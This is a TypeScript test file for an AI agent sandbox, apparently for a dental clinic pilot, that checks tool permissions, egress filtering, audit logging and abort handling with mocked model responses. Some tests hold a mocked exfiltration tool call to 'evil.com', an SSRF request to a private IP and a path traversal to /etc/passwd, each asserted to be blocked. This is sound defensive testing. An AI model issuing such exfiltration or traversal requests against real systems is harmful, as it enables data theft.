/**
 * V1 integration smoke test — full pipeline, no real network or LLM required.
 *
 * Proves the end-to-end path the dental pilot depends on:
 *
 *   message in
 *     → agent loop builds prompt (with recall context injected)
 *     → inference router calls LLM (mocked Ollama) → tool-call response
 *     → tool registry validates permissions via sandbox
 *     → egress proxy validates domain, SSRF guard (real enforcement, mocked fetch)
 *     → tool executes, result fed back to agent
 *     → second LLM call → plain-text final answer
 *     → done event emitted
 *     → audit log has inference rows + tool_call row + network row
 *
 * The sandbox (tool-permissions, egress-proxy, inference-router) is fully real.
 * Only the network layer is mocked: Ollama responses and the DuckDuckGo API.
 */

import { afterEach, describe, expect, test } from "bun:test";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { mkdtempSync, writeFileSync } from "node:fs";

import { openDatabase, type FeralDb } from "../src/db.ts";
import { AuditLog } from "../src/sandbox/audit-log.ts";
import { EgressProxy } from "../src/sandbox/egress-proxy.ts";
import { InferenceRouter } from "../src/sandbox/inference-router.ts";
import { EpisodicMemory } from "../src/memory/episodic.ts";
import { SemanticMemory } from "../src/memory/semantic.ts";
import { RecallEngine } from "../src/memory/recall.ts";
import { ToolRegistry } from "../src/tools/registry.ts";
import { RealProcessSandbox } from "../src/sandbox/process-sandbox.ts";
import { createWebSearchTool } from "../src/tools/builtin/web-search.ts";
import { createReadFileTool } from "../src/tools/builtin/read-file.ts";
import { AgentLoop } from "../src/core/agent-loop.ts";
import type { OutboundEvent } from "../src/types.ts";

// ---------------------------------------------------------------------------
// Fetch sequencer
// ---------------------------------------------------------------------------

type MockStep = { url: RegExp; status: number; body: unknown };

function installSequencedFetch(steps: MockStep[]): {
  restore: () => void;
  calls: string[];
  remaining: () => number;
} {
  const original = globalThis.fetch;
  const calls: string[] = [];
  let idx = 0;

  globalThis.fetch = (async (input: RequestInfo | URL): Promise<Response> => {
    const url =
      typeof input === "string"
        ? input
        : input instanceof URL
          ? input.toString()
          : (input as Request).url;
    calls.push(url);

    const step = steps[idx];
    if (!step) throw new Error(`unexpected fetch call #${idx + 1} to ${url}`);
    if (!step.url.test(url)) {
      throw new Error(`fetch #${idx + 1}: expected ${step.url} but got ${url}`);
    }
    idx++;

    return new Response(JSON.stringify(step.body), {
      status: step.status,
      headers: { "content-type": "application/json" },
    });
  }) as typeof fetch;

  return {
    restore: () => { globalThis.fetch = original; },
    calls,
    remaining: () => steps.length - idx,
  };
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function auditAll(db: FeralDb) {
  return db.raw
    .query<
      { action_type: string; result: string; tool_name: string | null; token_cost: number | null },
      []
    >("SELECT action_type, result, tool_name, token_cost FROM audit_log ORDER BY id")
    .all();
}

const BUDGET = { perConversation: 50_000, perDay: 500_000, onExhausted: "stop" } as const;

const ollamaOk = (content: string, promptTokens = 10, evalTokens = 5) => ({
  message: { content },
  prompt_eval_count: promptTokens,
  eval_count: evalTokens,
});

const ddgOk = (text: string) => ({
  AbstractText: text,
  AbstractURL: "https://duckduckgo.com/?q=test",
  RelatedTopics: [],
});

/** Build a fenced tool-call block — JSON.stringify handles Windows paths etc. */
function toolBlock(name: string, args: Record<string, unknown>): string {
  return "```tool\n" + JSON.stringify({ name, args }) + "\n```";
}

// ---------------------------------------------------------------------------

let restoreFetch: (() => void) | null = null;
afterEach(() => { restoreFetch?.(); restoreFetch = null; });

// ---------------------------------------------------------------------------

describe("full pipeline: message → tool call → sandbox → audit → response", () => {
  test("web_search happy path: tool call flows through egress proxy and audit log", async () => {
    const db = openDatabase(":memory:");
    const audit = new AuditLog(db.raw);
    const egress = new EgressProxy(audit.logger);
    const router = new InferenceRouter(
      { primary: { provider: "ollama", model: "m", baseUrl: "http://localhost:11434" }, tokenBudget: BUDGET },
      audit.logger, db.raw,
    );
    const episodic = new EpisodicMemory(db.raw, audit.logger);
    const recall = new RecallEngine(episodic, new SemanticMemory(db.raw, audit.logger));
    const registry = new ToolRegistry(egress, audit);
    registry.register(createWebSearchTool());
    const agent = new AgentLoop(router, registry, episodic, {}, recall);

    // Sequence:
    //  1. LLM  → web_search tool-call block
    //  2. DDG  → search result (via egress proxy, domain validated)
    //  3. LLM  → final plain-text answer
    const mock = installSequencedFetch([
      {
        url: /localhost:11434/,
        status: 200,
        body: ollamaOk("Let me search for that.\n" + toolBlock("web_search", { query: "dental appointment duration" })),
      },
      {
        url: /duckduckgo\.com/,
        status: 200,
        body: ddgOk("Dental checkups typically last 45–60 minutes."),
      },
      {
        url: /localhost:11434/,
        status: 200,
        body: ollamaOk("A dental appointment usually lasts about 45–60 minutes."),
      },
    ]);
    restoreFetch = mock.restore;

    const events: OutboundEvent[] = [];
    const response = await agent.handle(
      "sess-1",
      "how long does a dental appointment take?",
      "msg-1",
      (e) => events.push(e),
    );

    // Response
    expect(response).toContain("45");
    expect(events.some((e) => e.type === "done")).toBe(true);

    // All fetch steps consumed
    expect(mock.remaining()).toBe(0);

    // Tool lifecycle events
    expect(events.some((e) => e.type === "tool_start" && e.tool === "web_search")).toBe(true);
    expect(events.some((e) => e.type === "tool_done"  && e.tool === "web_search")).toBe(true);

    // Audit log: 2 × inference + 1 × tool_call + 1 × network + ≥2 × memory_write
    const rows = auditAll(db);
    const inference = rows.filter((r) => r.action_type === "inference");
    const toolCall  = rows.filter((r) => r.action_type === "tool_call");
    const network   = rows.filter((r) => r.action_type === "network");
    const memory    = rows.filter((r) => r.action_type === "memory_write");

    expect(inference.length).toBe(2);
    expect(inference.every((r) => r.result === "success")).toBe(true);
    expect(inference.every((r) => (r.token_cost ?? 0) > 0)).toBe(true);

    expect(toolCall.length).toBe(1);
    expect(toolCall[0]!.tool_name).toBe("web_search");
    expect(toolCall[0]!.result).toBe("success");

    expect(network.length).toBe(1);
    expect(network[0]!.tool_name).toBe("web_search");
    expect(network[0]!.result).toBe("success");

    expect(memory.length).toBeGreaterThanOrEqual(2);

    db.close();
  });

  test("sandbox blocks call to unregistered tool, audits it, never reaches network", async () => {
    const db = openDatabase(":memory:");
    const audit = new AuditLog(db.raw);
    const egress = new EgressProxy(audit.logger);
    const router = new InferenceRouter(
      { primary: { provider: "ollama", model: "m", baseUrl: "http://localhost:11434" }, tokenBudget: BUDGET },
      audit.logger, db.raw,
    );
    const episodic = new EpisodicMemory(db.raw, audit.logger);
    const recall = new RecallEngine(episodic, new SemanticMemory(db.raw, audit.logger));
    const registry = new ToolRegistry(egress, audit);
    // No tools registered — any tool the LLM names is unknown.
    const agent = new AgentLoop(router, registry, episodic, {}, recall);

    const mock = installSequencedFetch([
      {
        url: /localhost:11434/,
        status: 200,
        body: ollamaOk(toolBlock("exfiltrate_data", { dest: "evil.com" })),
      },
      {
        url: /localhost:11434/,
        status: 200,
        body: ollamaOk("I was unable to complete that action."),
      },
    ]);
    restoreFetch = mock.restore;

    const events: OutboundEvent[] = [];
    await agent.handle("sess-2", "do something sneaky", "msg-2", (e) => events.push(e));

    // No request to evil.com ever left the process.
    expect(mock.calls.filter((u) => u.includes("evil")).length).toBe(0);

    // A blocked audit row exists for the unknown tool.
    const blocked = auditAll(db).filter((r) => r.result === "blocked");
    expect(blocked.length).toBeGreaterThanOrEqual(1);
    expect(blocked.some((r) => r.tool_name === "exfiltrate_data")).toBe(true);

    db.close();
  });

  test("egress proxy blocks SSRF to private IP range and writes audit row", async () => {
    const db = openDatabase(":memory:");
    const audit = new AuditLog(db.raw);
    const egress = new EgressProxy(audit.logger);

    // Exercise the SSRF guard directly — no agent.handle needed.
    const fetchFn = egress.forTool(
      {
        name: "web_search", description: "d",
        permissions: ["network:outbound"], networkAccess: true,
        allowedDomains: ["duckduckgo.com"],
      },
      "sess-ssrf",
    );

    // 192.168.x.x is private — must be blocked before any network I/O.
    await expect(fetchFn("http://192.168.1.1/steal")).rejects.toThrow();

    const blocked = auditAll(db).filter((r) => r.result === "blocked");
    expect(blocked.length).toBeGreaterThanOrEqual(1);

    db.close();
  });

  test("read_file allows workspace path and rejects directory traversal", async () => {
    const workspace = mkdtempSync(join(tmpdir(), "feral-int-"));
    writeFileSync(join(workspace, "notes.txt"), "patient: John Doe, appt: 9am");

    const db = openDatabase(":memory:");
    const audit = new AuditLog(db.raw);
    const egress = new EgressProxy(audit.logger);
    const router = new InferenceRouter(
      { primary: { provider: "ollama", model: "m", baseUrl: "http://localhost:11434" }, tokenBudget: BUDGET },
      audit.logger, db.raw,
    );
    const episodic = new EpisodicMemory(db.raw, audit.logger);
    const recall = new RecallEngine(episodic, new SemanticMemory(db.raw, audit.logger));
    const registry = new ToolRegistry(egress, audit);
    registry.register(createReadFileTool([workspace]));
    const agent = new AgentLoop(router, registry, episodic, {}, recall);

    const filePath = join(workspace, "notes.txt");
    // toolBlock uses JSON.stringify for args — correctly escapes Windows paths.
    const mock = installSequencedFetch([
      {
        url: /localhost:11434/,
        status: 200,
        body: ollamaOk(toolBlock("read_file", { path: filePath })),
      },
      {
        url: /localhost:11434/,
        status: 200,
        body: ollamaOk("Patient John Doe has a 9am appointment."),
      },
    ]);
    restoreFetch = mock.restore;

    const events: OutboundEvent[] = [];
    const response = await agent.handle("sess-3", "read the notes file", "msg-3", (e) => events.push(e));
    expect(response).toContain("John Doe");
    expect(mock.remaining()).toBe(0);

    // Traversal attempt goes through the registry — sandbox must block it.
    const traversalPath = join(workspace, "..", "..", "etc", "passwd");
    const denied = await registry.call("read_file", { path: traversalPath }, "sess-3");
    expect(denied.ok).toBe(false);

    db.close();
  });

  test("inner-thoughts loop is off by default (feature flag)", () => {
    expect(process.env.FERAL_INNER_THOUGHTS_ENABLED === "true").toBe(false);
  });

  // -------------------------------------------------------------------------
  // P0-#2: `done` event must carry `stopped: boolean` so the frontend can
  // distinguish a user-initiated stop from a natural completion. Spec G6.
  // -------------------------------------------------------------------------

  test("done event has stopped:false on natural completion", async () => {
    const originalFetch = globalThis.fetch;
    try {
      // Mock Ollama to return a plain-text completion (no tool_call).
      globalThis.fetch = (async () =>
        new Response(
          JSON.stringify(ollamaOk("All done — no tools needed.")),
          { status: 200, headers: { "content-type": "application/json" } },
        )) as typeof fetch;

      const db = openDatabase(":memory:");
      const audit = new AuditLog(db.raw);
      const egress = new EgressProxy(audit.logger);
      const router = new InferenceRouter(
        { primary: { provider: "ollama", model: "qwen2.5:7b", baseUrl: "http://localhost:11434" }, tokenBudget: BUDGET },
        audit.logger, db.raw,
      );
      const episodic = new EpisodicMemory(db.raw, audit.logger);
      const recall = new RecallEngine(episodic, new SemanticMemory(db.raw, audit.logger));
      const registry = new ToolRegistry(egress, audit, new RealProcessSandbox(audit.logger));
      const agent = new AgentLoop(router, registry, episodic, {}, recall);

      const events: OutboundEvent[] = [];
      await agent.handle("s1", "hello", "m1", (e) => events.push(e));

      const done = [...events].reverse().find((e) => e.type === "done");
      expect(done).toBeDefined();
      expect(done!.type).toBe("done");
      expect((done as { stopped: boolean }).stopped).toBe(false);

      db.close();
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  test("done event has stopped:true when user aborts mid-iteration", async () => {
    const originalFetch = globalThis.fetch;
    try {
      // Mock Ollama: first call returns a tool_call; the second call (which
      // happens after `agent.stop()` is invoked from the tool_start handler)
      // throws AbortError to simulate the user cancelling the in-flight
      // inference. The router's `abort()` deletes the active controller and
      // creates a fresh one on the next call — so the second call's signal
      // isn't pre-aborted; we simulate the cancellation by checking a
      // closure flag set inside the `agent.stop()` callback below.
      let callIndex = 0;
      let aborted = false;
      globalThis.fetch = (async () => {
        callIndex++;
        if (aborted) {
          throw new DOMException("The operation was aborted.", "AbortError");
        }
        const body = callIndex === 1
          ? ollamaOk('<tool_call>{"name":"read_file","arguments":{"path":"x"}}</tool_call>')
          : ollamaOk("stopped early");
        return new Response(JSON.stringify(body), {
          status: 200, headers: { "content-type": "application/json" },
        });
      }) as typeof fetch;

      const db = openDatabase(":memory:");
      const audit = new AuditLog(db.raw);
      const egress = new EgressProxy(audit.logger);
      const router = new InferenceRouter(
        { primary: { provider: "ollama", model: "qwen2.5:7b", baseUrl: "http://localhost:11434" }, tokenBudget: BUDGET },
        audit.logger, db.raw,
      );
      const episodic = new EpisodicMemory(db.raw, audit.logger);
      const recall = new RecallEngine(episodic, new SemanticMemory(db.raw, audit.logger));
      const registry = new ToolRegistry(egress, audit, new RealProcessSandbox(audit.logger));
      const agent = new AgentLoop(router, registry, episodic, {}, recall);

      const events: OutboundEvent[] = [];
      const handlePromise = agent.handle("s1", "read x", "m1", (e) => {
        events.push(e);
        if (e.type === "tool_start") {
          aborted = true;
          agent.stop("s1");
        }
      });
      await handlePromise;

      const done = [...events].reverse().find((e) => e.type === "done");
      expect(done).toBeDefined();
      expect((done as { stopped: boolean }).stopped).toBe(true);

      db.close();
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});
